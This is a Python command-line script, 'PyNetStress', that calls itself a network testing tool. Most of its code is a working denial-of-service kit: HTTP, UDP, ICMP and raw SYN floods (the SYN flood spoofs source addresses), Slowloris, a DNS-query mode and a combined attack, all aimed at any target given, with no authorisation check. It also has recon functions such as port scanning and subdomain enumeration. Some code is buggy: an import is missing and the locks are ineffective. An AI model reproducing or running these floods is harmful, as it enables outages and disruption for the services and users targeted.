#!/usr/bin/env python3
import os
import sys
import time
import socket
import random
import threading
import subprocess
import ipaddress
import requests
import dns.resolver
import whois
import speedtest
import psutil
import geoip2.database
import argparse
from datetime import datetime
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
import struct
import select
import re

IS_TERMUX = 'com.termux' in os.environ.get('PREFIX', '')
IS_ROOT = os.geteuid() == 0 if os.name == 'posix' else ctypes.windll.shell32.IsUserAnAdmin() != 0 if os.name == 'nt' else False
DEBUG_MODE = False

class PyNetStressTerminal:
    def __init__(self):
        self.running = False
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "bytes_sent": 0,
            "start_time": 0,
            "success_rate": 0,
            "target_status": "Unknown"
        }
        self.target_ip = ""
        self.target_url = ""
        self.target_port = 80
        self.bot_count = 100
        self.thread_count = 50
        self.duration = 30
        self.method = "HTTP Flood"
        self.use_proxies = False
        self.proxies = []
        self.cpu_usage = 0
        self.memory_usage = 0
        self.network_usage = 0
        self.start_network_stats = psutil.net_io_counters()
        self.check_dependencies()
        
    def debug_log(self, message):
        if DEBUG_MODE:
            print(f"[DEBUG] {message}")
    
    def check_dependencies(self):
        missing_deps = []
        try:
            geoip2.database.Reader('GeoLite2-City.mmdb')
        except:
            missing_deps.append("GeoLite2-City database")
        if missing_deps:
            print("[WARNING] Missing dependencies:")
            for dep in missing_deps:
                print(f"  - {dep}")
    
    def print_banner(self):
        banner = r"""
  ____        _   _   _      ____  _             _   
 |  _ \ _   _| | | | | |_ __/ ___|| |_ ___  _ __| |_ 
 | |_) | | | | | | | | | '_ \___ \| __/ _ \| '__| __|
 |  __/| |_| | | | |_| | | | |__) | || (_) | |  | |_ 
 |_|    \__, |_|  \___/|_| |_|____/ \__\___/|_|   \__|
        |___/                                         
        """
        print(banner)
        print("PyNetStress Terminal Version - Advanced Network Testing Tool")
        print("=" * 60)
        print(f"Platform: {sys.platform}")
        print(f"Root: {IS_ROOT}")
        print(f"Termux: {IS_TERMUX}")
        print(f"Debug: {DEBUG_MODE}")
        print("=" * 60)
    
    def resolve_target(self, target):
        try:
            if not re.match(r"^https?://", target):
                target = "http://" + target
            parsed = urlparse(target)
            domain = parsed.netloc or parsed.path
            if ":" in domain:
                domain = domain.split(":")[0]
            self.target_ip = socket.gethostbyname(domain)
            self.target_url = domain
            self.debug_log(f"Resolved {target} to {self.target_ip}")
            return True
        except Exception as e:
            print(f"[ERROR] Failed to resolve target: {e}")
            return False
    
    def get_geolocation(self, target):
        try:
            reader = geoip2.database.Reader('GeoLite2-City.mmdb')
            response = reader.city(target)
            country = response.country.name
            city = response.city.name
            return f"{city}, {country}"
        except:
            return "Location unknown"
    
    def reset_stats(self):
        self.attack_stats = {
            "packets_sent": 0,
            "requests_sent": 0,
            "bytes_sent": 0,
            "start_time": time.time(),
            "success_rate": 0,
            "target_status": "Unknown"
        }
        self.start_network_stats = psutil.net_io_counters()
        print("[INFO] Statistics reset")
    
    def http_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        print(f"[INFO] Starting HTTP Flood on {target_ip}:{target_port}")
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        paths = ['/', '/index.html', '/api/data', '/images/logo.png', '/videos/demo.mp4']
        methods = ['GET', 'POST', 'HEAD']
        host = self.target_url if self.target_url else target_ip
        start_time = time.time()
        end_time = start_time + duration
        
        def http_worker():
            local_count = 0
            local_bytes = 0
            while time.time() < end_time and self.running:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2.0)
                        s.connect((target_ip, target_port))
                        method = random.choice(methods)
                        path = random.choice(paths)
                        request = (
                            f"{method} {path} HTTP/1.1\r\n"
                            f"Host: {host}\r\n"
                            f"User-Agent: {random.choice(user_agents)}\r\n"
                            f"Accept: */*\r\n"
                            f"Connection: close\r\n"
                            f"\r\n"
                        )
                        s.send(request.encode())
                        local_count += 1
                        local_bytes += len(request)
                        try:
                            response = s.recv(1024)
                            local_bytes += len(response)
                        except:
                            pass
                        if local_count % 10 == 0:
                            with threading.Lock():
                                self.attack_stats['requests_sent'] += local_count
                                self.attack_stats['bytes_sent'] += local_bytes
                                local_count = 0
                                local_bytes = 0
                except Exception as e:
                    self.debug_log(f"HTTP worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['requests_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for _ in range(min(500, thread_count * bot_count)):
            t = threading.Thread(target=http_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Attack stopped by user")
        print("[INFO] HTTP Flood completed")
    
    def udp_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT and os.name == 'posix':
            print("[ERROR] UDP Flood requires root on Unix systems")
            return
        print(f"[INFO] Starting UDP Flood on {target_ip}:{target_port}")
        start_time = time.time()
        end_time = start_time + duration
        
        def udp_worker():
            local_count = 0
            local_bytes = 0
            while time.time() < end_time and self.running:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        payload = os.urandom(random.randint(64, 1024))
                        s.sendto(payload, (target_ip, target_port))
                        local_count += 1
                        local_bytes += len(payload)
                        if local_count % 50 == 0:
                            with threading.Lock():
                                self.attack_stats['packets_sent'] += local_count
                                self.attack_stats['bytes_sent'] += local_bytes
                                local_count = 0
                                local_bytes = 0
                except Exception as e:
                    self.debug_log(f"UDP worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for _ in range(min(500, thread_count * bot_count)):
            t = threading.Thread(target=udp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Attack stopped by user")
        print("[INFO] UDP Flood completed")
    
    def syn_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT:
            print("[ERROR] SYN Flood requires root privileges")
            return
        print(f"[INFO] Starting SYN Flood on {target_ip}:{target_port}")
        start_time = time.time()
        end_time = start_time + duration
        
        def syn_worker():
            local_count = 0
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    source_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
                    ip_ver = 4
                    ip_ihl = 5
                    ip_tos = 0
                    ip_tot_len = 0
                    ip_id = random.randint(1, 65535)
                    ip_frag_off = 0
                    ip_ttl = 255
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0
                    ip_saddr = socket.inet_aton(source_ip)
                    ip_daddr = socket.inet_aton(target_ip)
                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                                        ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                        ip_frag_off, ip_ttl, ip_proto, ip_check,
                                        ip_saddr, ip_daddr)
                    source_port = random.randint(1024, 65535)
                    dest_port = target_port
                    seq = random.randint(0, 4294967295)
                    ack_seq = 0
                    doff = 5
                    fin = 0
                    syn = 1
                    rst = 0
                    psh = 0
                    ack = 0
                    urg = 0
                    window = socket.htons(5840)
                    check = 0
                    urg_ptr = 0
                    offset_res = (doff << 4)
                    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
                    tcp_header = struct.pack('!HHLLBBHHH',
                                         source_port, dest_port, seq, ack_seq,
                                         offset_res, tcp_flags, window, check, urg_ptr)
                    source_address = socket.inet_aton(source_ip)
                    dest_address = socket.inet_aton(target_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    psh = struct.pack('!4s4sBBH',
                                  source_address, dest_address,
                                  placeholder, protocol, tcp_length)
                    psh = psh + tcp_header
                    tcp_check = self.checksum(psh)
                    tcp_header = struct.pack('!HHLLBBH',
                                         source_port, dest_port, seq, ack_seq,
                                         offset_res, tcp_flags, window) + struct.pack('H', tcp_check) + struct.pack('!H', urg_ptr)
                    packet = ip_header + tcp_header
                    s.sendto(packet, (target_ip, 0))
                    local_count += 1
                    if local_count % 50 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            local_count = 0
                except Exception as e:
                    self.debug_log(f"SYN worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count

        threads = []
        for _ in range(min(200, thread_count * bot_count)):
            t = threading.Thread(target=syn_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Attack stopped by user")
        print("[INFO] SYN Flood completed")
    
    def checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s = s + w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        s = ~s & 0xffff
        return s
    
    def icmp_flood(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT and os.name == 'posix':
            print("[ERROR] ICMP Flood requires root on Unix systems")
            return
        print(f"[INFO] Starting ICMP Flood on {target_ip}")
        start_time = time.time()
        end_time = start_time + duration
        
        def icmp_worker():
            local_count = 0
            local_bytes = 0
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    icmp_type = 8
                    icmp_code = 0
                    icmp_check = 0
                    icmp_id = random.randint(0, 65535)
                    icmp_seq = random.randint(0, 65535)
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                    payload = os.urandom(random.randint(32, 1024))
                    icmp_check = self.checksum(icmp_header + payload)
                    icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_check, icmp_id, icmp_seq)
                    packet = icmp_header + payload
                    s.sendto(packet, (target_ip, 0))
                    local_count += 1
                    local_bytes += len(packet)
                    if local_count % 50 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                except Exception as e:
                    self.debug_log(f"ICMP worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for _ in range(min(200, thread_count * bot_count)):
            t = threading.Thread(target=icmp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Attack stopped by user")
        print("[INFO] ICMP Flood completed")
    
    def slowloris(self, target_ip, target_port, bot_count, thread_count, duration):
        print(f"[INFO] Starting Slowloris on {target_ip}:{target_port}")
        start_time = time.time()
        end_time = start_time + duration
        
        def slowloris_worker():
            sockets = []
            headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept-language: en-US,en,q=0.5"
            ]
            for i in range(150):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    for header in headers:
                        s.send(f"{header}\r\n".encode())
                    sockets.append(s)
                except Exception as e:
                    self.debug_log(f"Slowloris socket error: {e}")
            while time.time() < end_time and self.running:
                for s in sockets:
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                        with threading.Lock():
                            self.attack_stats['requests_sent'] += 1
                    except Exception as e:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.settimeout(3)
                            s.connect((target_ip, target_port))
                            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                            for header in headers:
                                s.send(f"{header}\r\n".encode())
                            sockets.append(s)
                        except:
                            pass
                time.sleep(15)
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

        threads = []
        for _ in range(min(50, bot_count)):
            t = threading.Thread(target=slowloris_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Attack stopped by user")
        print("[INFO] Slowloris completed")
    
    def dns_amplification(self, target_ip, target_port, bot_count, thread_count, duration):
        if not IS_ROOT and os.name == 'posix':
            print("[ERROR] DNS Amplification requires root on Unix systems")
            return
        print(f"[INFO] Starting DNS Amplification on {target_ip}")
        dns_servers = [
            "8.8.8.8",
            "1.1.1.1",
            "9.9.9.9",
            "64.6.64.6",
            "208.67.222.222",
        ]
        query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x03isc\x03org\x00\x00\x01\x00\x01\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00"
        start_time = time.time()
        end_time = start_time + duration
        
        def dns_worker():
            local_count = 0
            local_bytes = 0
            while time.time() < end_time and self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.settimeout(1)
                    s.bind(('0.0.0.0', 0))
                    dns_server = random.choice(dns_servers)
                    s.sendto(query, (dns_server, 53))
                    local_count += 1
                    local_bytes += len(query)
                    if local_count % 50 == 0:
                        with threading.Lock():
                            self.attack_stats['packets_sent'] += local_count
                            self.attack_stats['bytes_sent'] += local_bytes
                            local_count = 0
                            local_bytes = 0
                except Exception as e:
                    self.debug_log(f"DNS worker error: {e}")
            if local_count > 0:
                with threading.Lock():
                    self.attack_stats['packets_sent'] += local_count
                    self.attack_stats['bytes_sent'] += local_bytes

        threads = []
        for _ in range(min(500, thread_count * bot_count)):
            t = threading.Thread(target=dns_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Attack stopped by user")
        print("[INFO] DNS Amplification completed")
    
    def mixed_attack(self, target_ip, target_port, bot_count, thread_count, duration):
        print(f"[INFO] Starting MIXED attack on {target_ip}:{target_port}")
        methods = [
            (self.http_flood, 1),
            (self.udp_flood, 1),
            (self.syn_flood, 1),
            (self.icmp_flood, 1),
            (self.slowloris, 1),
            (self.dns_amplification, 1)
        ]
        threads = []
        for method, weight in methods:
            for _ in range(weight):
                t = threading.Thread(
                    target=method,
                    args=(target_ip, target_port, bot_count, thread_count, duration),
                    daemon=True
                )
                t.start()
                threads.append(t)
        start_time = time.time()
        end_time = start_time + duration
        try:
            for t in threads:
                t.join(timeout=max(0, end_time - time.time()))
        except KeyboardInterrupt:
            self.running = False
            print("[INFO] Attack stopped by user")
        print("[INFO] Mixed attack completed")
    
    def start_attack(self, target, method, bots=100, threads=50, duration=30, port=80):
        if not self.resolve_target(target):
            return False
        self.target_port = port
        self.bot_count = min(bots, 10000)
        self.thread_count = min(threads, 500)
        self.duration = min(duration, 300)
        self.method = method
        self.reset_stats()
        geo = self.get_geolocation(self.target_ip)
        print(f"[INFO] Target: {target} -> {self.target_ip}:{port}")
        print(f"[INFO] Location: {geo}")
        print(f"[INFO] Method: {method}, Bots: {bots}, Threads: {threads}, Duration: {duration}s")
        print("-" * 60)
        self.running = True
        stats_thread = threading.Thread(target=self.monitor_stats, daemon=True)
        stats_thread.start()
        if method == "HTTP Flood":
            self.http_flood(self.target_ip, port, bots, threads, duration)
        elif method == "UDP Flood":
            self.udp_flood(self.target_ip, port, bots, threads, duration)
        elif method == "SYN Flood":
            self.syn_flood(self.target_ip, port, bots, threads, duration)
        elif method == "ICMP Flood":
            self.icmp_flood(self.target_ip, port, bots, threads, duration)
        elif method == "Slowloris":
            self.slowloris(self.target_ip, port, bots, threads, duration)
        elif method == "DNS Amplification":
            self.dns_amplification(self.target_ip, port, bots, threads, duration)
        elif method == "Mixed Attack":
            self.mixed_attack(self.target_ip, port, bots, threads, duration)
        else:
            print(f"[ERROR] Unknown method: {method}")
            return False
        self.running = False
        return True
    
    def monitor_stats(self):
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            packets = self.attack_stats['packets_sent']
            requests = self.attack_stats['requests_sent']
            bytes_sent = self.attack_stats['bytes_sent']
            if bytes_sent > 1024*1024*1024:
                data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
            elif bytes_sent > 1024*1024:
                data_text = f"{bytes_sent/(1024*1024):.2f} MB"
            elif bytes_sent > 1024:
                data_text = f"{bytes_sent/1024:.2f} KB"
            else:
                data_text = f"{bytes_sent} B"
            sys.stdout.write("\033[K")
            sys.stdout.write(f"\r[STATS] Time: {int(elapsed)}s | Packets: {packets:,} | Requests: {requests:,} | Data: {data_text}")
            sys.stdout.flush()
            time.sleep(1)
        elapsed = time.time() - start_time
        packets = self.attack_stats['packets_sent']
        requests = self.attack_stats['requests_sent']
        bytes_sent = self.attack_stats['bytes_sent']
        if bytes_sent > 1024*1024*1024:
            data_text = f"{bytes_sent/(1024*1024*1024):.2f} GB"
        elif bytes_sent > 1024*1024:
            data_text = f"{bytes_sent/(1024*1024):.2f} MB"
        elif bytes_sent > 1024:
            data_text = f"{bytes_sent/1024:.2f} KB"
        else:
            data_text = f"{bytes_sent} B"
        print(f"\n[INFO] Attack completed in {int(elapsed)}s")
        print(f"[INFO] Total packets: {packets:,}")
        print(f"[INFO] Total requests: {requests:,}")
        print(f"[INFO] Total data: {data_text}")
    
    def ping(self, target):
        if not self.resolve_target(target):
            return False
        count = 4
        timeout = 2
        print(f"[INFO] Pinging {target} ({self.target_ip}) with {count} packets")
        if os.name == 'nt':
            cmd = ['ping', '-n', str(count), '-w', str(timeout*1000), self.target_ip]
        else:
            cmd = ['ping', '-c', str(count), '-W', str(timeout), self.target_ip]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except Exception as e:
            print(f"[ERROR] Ping failed: {e}")
    
    def traceroute(self, target):
        if not self.resolve_target(target):
            return False
        print(f"[INFO] Traceroute to {target} ({self.target_ip})")
        if os.name == 'nt':
            cmd = ['tracert', self.target_ip]
        else:
            cmd = ['traceroute', self.target_ip]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            print(result.stdout)
            if result.stderr:
                print(result.stderr)
        except Exception as e:
            print(f"[ERROR] Traceroute failed: {e}")
    
    def port_scan(self, target):
        if not self.resolve_target(target):
            return False
        print(f"[INFO] Scanning common ports on {target} ({self.target_ip})")
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 587, 993, 995, 3306, 3389, 8080, 8443]
        open_ports = []
        for port in common_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((self.target_ip, port))
                    if result == 0:
                        open_ports.append(port)
                        print(f"[+] Port {port}: OPEN")
                    else:
                        print(f"[-] Port {port}: closed")
            except Exception as e:
                print(f"[ERROR] Error scanning port {port}: {e}")
        print(f"[INFO] Open ports: {', '.join(map(str, open_ports))}")
    
    def whois_lookup(self, target):
        try:
            print(f"[INFO] WHOIS lookup for {target}")
            w = whois.whois(target)
            print(f"Domain: {w.domain_name}")
            print(f"Registrar: {w.registrar}")
            print(f"Creation Date: {w.creation_date}")
            print(f"Expiration Date: {w.expiration_date}")
            print(f"Name Servers: {w.name_servers}")
        except Exception as e:
            print(f"[ERROR] WHOIS lookup failed: {e}")
    
    def dns_enum(self, target):
        try:
            print(f"[INFO] DNS enumeration for {target}")
            resolver = dns.resolver.Resolver()
            try:
                answers = resolver.resolve(target, 'A')
                print("A Records:")
                for rdata in answers:
                    print(f"  {rdata.address}")
            except:
                print("No A records found")
            try:
                answers = resolver.resolve(target, 'MX')
                print("MX Records:")
                for rdata in answers:
                    print(f"  {rdata.exchange} (priority {rdata.preference})")
            except:
                print("No MX records found")
            try:
                answers = resolver.resolve(target, 'NS')
                print("NS Records:")
                for rdata in answers:
                    print(f"  {rdata.target}")
            except:
                print("No NS records found")
        except Exception as e:
            print(f"[ERROR] DNS enumeration failed: {e}")
    
    def subdomain_scan(self, target):
        print(f"[INFO] Scanning for subdomains of {target}")
        common_subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 'imap', 'test',
            'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 'news', 'vpn', 'ns3',
            'mail2', 'new', 'mysql', 'old', 'lists', 'support', 'mobile', 'mx', 'static',
            'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 'cp', 'calendar', 'wiki',
            'web', 'media', 'email', 'images', 'img', 'www1', 'intranet', 'portal', 'video',
            'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1', 'files', 'host', 'ssl', 'search',
            'staging', 'fw', 'manager', 'cdn2', 'irc', 'job', 'img2', 'ssh', 'online', 'owa'
        ]
        found_subdomains = []
        for subdomain in common_subdomains:
            full_domain = f"{subdomain}.{target}"
            try:
                socket.gethostbyname(full_domain)
                found_subdomains.append(full_domain)
                print(f"[+] Found: {full_domain}")
            except:
                pass
        print(f"[INFO] Found {len(found_subdomains)} subdomains")
    
    def network_scan(self, network):
        print(f"[INFO] Scanning network {network}")
        try:
            network = ipaddress.ip_network(network, strict=False)
        except ValueError:
            print(f"[ERROR] Invalid network: {network}")
            return
        live_hosts = []
        for ip in network.hosts():
            ip_str = str(ip)
            try:
                hostname = socket.gethostbyaddr(ip_str)[0]
            except:
                hostname = "Unknown"
            if os.name == 'nt':
                cmd = ['ping', '-n', '1', '-w', '1000', ip_str]
            else:
                cmd = ['ping', '-c', '1', '-W', '1', ip_str]
            try:
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    live_hosts.append((ip_str, hostname))
                    print(f"[+] Live host: {ip_str} ({hostname})")
            except:
                pass
        print(f"[INFO] Found {len(live_hosts)} live hosts in {network}")
    
    def speed_test(self):
        print("[INFO] Testing network speed...")
        try:
            st = speedtest.Speedtest()
            st.get_best_server()
            download = st.download() / 1_000_000
            upload = st.upload() / 1_000_000
            ping = st.results.ping
            print(f"Download: {download:.2f} Mbps")
            print(f"Upload: {upload:.2f} Mbps")
            print(f"Ping: {ping:.2f} ms")
        except Exception as e:
            print(f"[ERROR] Speed test failed: {e}")

def main():
    global DEBUG_MODE
    parser = argparse.ArgumentParser(description="PyNetStress Terminal Version")
    subparsers = parser.add_subparsers(dest='command')
    
    attack_parser = subparsers.add_parser('attack')
    attack_parser.add_argument('target')
    attack_parser.add_argument('-m', '--method', choices=['HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 'Slowloris', 'DNS Amplification', 'Mixed Attack'], 
                              default='HTTP Flood')
    attack_parser.add_argument('-b', '--bots', type=int, default=100)
    attack_parser.add_argument('-t', '--threads', type=int, default=50)
    attack_parser.add_argument('-d', '--duration', type=int, default=30)
    attack_parser.add_argument('-p', '--port', type=int, default=80)
    attack_parser.add_argument('--debug', action='store_true')
    
    recon_parser = subparsers.add_parser('recon')
    recon_subparsers = recon_parser.add_subparsers(dest='recon_command')
    
    ping_parser = recon_subparsers.add_parser('ping')
    ping_parser.add_argument('target')
    
    traceroute_parser = recon_subparsers.add_parser('traceroute')
    traceroute_parser.add_argument('target')
    
    portscan_parser = recon_subparsers.add_parser('portscan')
    portscan_parser.add_argument('target')
    
    whois_parser = recon_subparsers.add_parser('whois')
    whois_parser.add_argument('target')
    
    dns_parser = recon_subparsers.add_parser('dns')
    dns_parser.add_argument('target')
    
    subdomain_parser = recon_subparsers.add_parser('subdomain')
    subdomain_parser.add_argument('target')
    
    netscan_parser = recon_subparsers.add_parser('netscan')
    netscan_parser.add_argument('network')
    
    speedtest_parser = recon_subparsers.add_parser('speedtest')
    
    reset_parser = subparsers.add_parser('reset')
    
    args = parser.parse_args()
    
    if hasattr(args, 'debug'):
        DEBUG_MODE = args.debug
    
    tool = PyNetStressTerminal()
    tool.print_banner()
    
    if not args.command:
        parser.print_help()
        return
    
    if args.command == 'attack':
        if not IS_ROOT and args.method in ['UDP Flood', 'SYN Flood', 'ICMP Flood', 'DNS Amplification']:
            print("[WARNING] This method requires root. Some features may not work.")
        tool.start_attack(
            target=args.target,
            method=args.method,
            bots=args.bots,
            threads=args.threads,
            duration=args.duration,
            port=args.port
        )
    elif args.command == 'recon':
        if args.recon_command == 'ping':
            tool.ping(args.target)
        elif args.recon_command == 'traceroute':
            tool.traceroute(args.target)
        elif args.recon_command == 'portscan':
            tool.port_scan(args.target)
        elif args.recon_command == 'whois':
            tool.whois_lookup(args.target)
        elif args.recon_command == 'dns':
            tool.dns_enum(args.target)
        elif args.recon_command == 'subdomain':
            tool.subdomain_scan(args.target)
        elif args.recon_command == 'netscan':
            tool.network_scan(args.network)
        elif args.recon_command == 'speedtest':
            tool.speed_test()
        else:
            recon_parser.print_help()
    elif args.command == 'reset':
        tool.reset_stats()
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[INFO] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)